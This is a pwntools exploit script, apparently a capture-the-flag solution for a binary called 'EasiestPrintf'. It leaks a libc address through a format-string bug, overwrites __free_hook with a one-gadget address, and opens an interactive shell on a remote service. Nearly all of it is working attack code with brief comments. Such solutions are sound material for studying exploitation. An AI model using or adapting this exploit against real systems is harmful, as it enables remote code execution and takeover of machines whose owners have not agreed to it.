from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'critical'

libc = ELF('./libc.so.6_0ed9bad239c74870ed2db31c735132ce')
binary = ELF('./EasiestPrintf')
read_got = binary.symbols['_GLOBAL_OFFSET_TABLE_'] + 12
libc.symbols['one_gadget'] = 0x3E297

def exec_fmt(payload):
    p = binary.process(env={ 'LD_PRELOAD': libc.path })
    p.sendline(str(read_got))
    p.recvuntil('Good Bye\n')
    p.sendline(payload)
    return p.recvall()

fmt = FmtStr(exec_fmt)
log.critical('offset: ' + str(fmt.offset))


# r = binary.process(env={ 'LD_PRELOAD': libc.path })
# gdb.attach(r, '''
# c
# ''')
r = remote('202.120.7.210', 12321)

print r.recvline()

# Leak the libc base address.
r.sendline(str(read_got))
data = r.recvline()
print data
read_addr = int(data, 16)
libc.address = read_addr - libc.symbols['read']
log.critical('libc_base: ' + hex(libc.address))
log.critical('__free_hook: ' + hex(libc.symbols['__free_hook']))
log.critical('one gadget: ' + hex(libc.symbols['one_gadget']))

# Use format string to override the value of __free_hook to one gadget and
# trigger free by a long width format string.
print r.recvline()
r.sendline(fmtstr_payload(fmt.offset, { libc.symbols['__free_hook']: libc.symbols['one_gadget'] }) + '%100000c')
r.interactive()